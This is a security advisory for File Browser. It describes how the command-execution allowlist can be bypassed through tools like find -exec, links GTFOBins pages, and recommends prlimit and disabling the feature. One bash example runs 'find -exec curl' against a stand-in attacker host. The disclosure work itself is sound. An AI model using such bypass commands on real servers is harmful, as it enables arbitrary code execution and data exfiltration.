summary: "filebrowser Allows Shell Commands to Spawn Other Commands\n## Summary ##\n\nThe *Command\
  \ Execution* feature of File Browser only allows the execution of shell command which have\
  \ been predefined on a user-specific allowlist. Many tools allow the execution of arbitrary\
  \ different commands, rendering this limitation void.\n\n## Impact ##\n\nThe concrete impact\
  \ depends on the commands being granted to the attacker, but the large number of standard\
  \ commands allowing the execution of subcommands makes it likely that every user having the\
  \ `Execute commands` permissions can exploit this vulnerability. Everyone who can exploit\
  \ it will have full code execution rights with the *uid* of the server process.\n\n## Vulnerability\
  \ Description ##\n\nMany Linux commands allow the execution of arbitrary different commands.\
  \ For example, if a user is authorized to run only the `find` command and nothing else, this\
  \ restriction can be circumvented by using the `-exec` flag.\n\nSome common commands having\
  \ the ability to launch external commands and which are included in the official container\
  \ image of Filebrowser are listed below. The website <https://gtfobins.github.io> gives a\
  \ comprehensive overview:\n\n* <https://gtfobins.github.io/gtfobins/cpio>\n* <https://gtfobins.github.io/gtfobins/find>\n\
  * <https://gtfobins.github.io/gtfobins/sed>\n* <https://gtfobins.github.io/gtfobins/git>\n\
  * <https://gtfobins.github.io/gtfobins/env>\n\nAs a prerequisite, an attacker needs an account\
  \ with the `Execute Commands` permission and some permitted commands.\n\n## Proof of Concept\
  \ ##\n\nThe following screenshot demonstrates, how this can be used to issue a network call\
  \ to an external server:\n\n![image](https://github.com/user-attachments/assets/02ef0833-79ee-40f7-87b8-bbb3fe102eab)\n\
  \n## Recommended Countermeasures ##\n\nUntil this issue is fixed, we recommend to completely\
  \ disable `Execute commands` for all accounts. Since the command execution is an inherently\
  \ dangerous feature that is not used by all deployments, it should be possible to completely\
  \ disable it in the application's configuration.\n\nThe `prlimit` command can be used to prevent\
  \ the execution of subcommands:\n\n```bash\n$ find . -exec curl http://evil.com {} \\;\n<HTML>\n\
  <HEAD>\n[...]\n\n$ prlimit --nproc=0 find . -exec curl http://evil.com {} \\;\nfind: cannot\
  \ fork: Resource temporarily unavailable\n```\n\nIt should be prepended to any command executed\
  \ in the context of the application. `prlimit` can be used for containerized deployments as\
  \ well as for bare-metal ones.\n\nWARNING: Note that this does prevent any unexpected behavior\
  \ from the authorized command. For example, the `find` command can also delete files directly\
  \ via its `-delete` flag.\n\nAs a defense-in-depth measure, Filebrowser should provide an\
  \ additional container image based on a *distroless* base image.\n\n## Timeline ##\n\n* `2025-06-25`\
  \ A patch version has been pushed to disable the feature for all existent installations, and\
  \ making it **opt-in**. A warning has been added to the documentation and is printed on the\
  \ console if the feature is enabled. Due to the project being in maintenance-only mode, the\
  \ bug has not been fixed. Fix is tracked on https://github.com/filebrowser/filebrowser/issues/5199.\n\
  * `2025-03-26` Identified the vulnerability in version 2.32.0\n\n## References ##\n\n* [prlimit](https://manpages.debian.org/bookworm/util-linux/prlimit.1.en.html)\n\
  * [\"Distroless\" Container Images.](https://github.com/GoogleContainerTools/distroless)\n\
  \ \n## Credits ##\n\n* Mathias Tausig ([SBA Research](https://www.sba-research.org/))"
